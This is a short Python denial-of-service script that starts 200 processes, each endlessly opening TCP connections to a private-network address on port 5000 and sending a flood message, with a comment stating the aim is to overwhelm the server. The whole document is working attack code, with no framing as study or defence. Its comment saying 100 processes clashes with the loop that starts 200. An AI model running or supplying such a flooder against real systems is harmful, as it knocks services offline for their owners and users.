import multiprocessing
import socket
def dos_attack():
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect(('192.168.165.135', 5000))
            client_socket.send(b"Flood, Request!")
            
            client_socket.close()
        except Exception as e:
            print(f"Error: {e}")
if __name__ == "__main__":
    # Create multiple processes to overwhelm the server
    for i in range(200):  # Start 100 processes
        process = multiprocessing.Process(target=dos_attack)
        process.start()
